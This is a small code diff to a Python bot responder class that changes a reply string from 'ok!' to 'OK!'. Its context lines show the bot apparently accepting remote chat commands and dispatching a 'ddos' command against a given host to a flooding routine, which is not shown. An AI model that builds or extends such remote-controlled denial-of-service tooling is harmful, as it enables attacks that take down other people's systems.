@@ -21,7 +21,7 @@ class Toast(BaseResponder):
 		if self.is_command(msg):
 			command = (str(msg).split('!')[-1])
 			print('>>> COMMAND RECEIVED: %s' % command)
-			self.respond(msg, command + ' ok!')
+			self.respond(msg, command + ' OK!')
 			cmd = command.split()
 			if cmd[0] == 'ddos' and cmd[1]:
 				self.dudos(host=cmd[1])
